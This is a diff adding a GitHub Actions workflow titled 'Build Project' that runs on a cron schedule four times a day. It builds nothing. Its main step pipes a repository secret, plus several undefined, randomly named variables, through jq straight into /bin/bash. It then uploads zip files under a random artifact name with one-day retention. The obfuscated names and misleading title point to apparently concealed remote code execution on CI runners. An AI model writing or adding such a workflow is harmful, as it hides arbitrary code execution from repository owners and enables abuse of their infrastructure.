@@ -1,0 +1,36 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          aua1472: ${{ secrets.aua1472 }}
+        run: |
+          printf '%s' "$aua1472" | jq -r .cz6 | /bin/bash
+          printf '%s' "$i4764" | jq -r .ztru37462 | /bin/bash
+          echo $yxr77 | jq -r .eqqmm6 | /bin/bash
+          echo $a108 | jq -r .ysj9 | /bin/bash
+          echo $msjh54673 | jq -r .ejm662 | /bin/bash
+          printf '%s' "$utsd33" | jq -r .j3 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: p8yfUjJh
+          path: "*.zip"
+          retention-days: 1
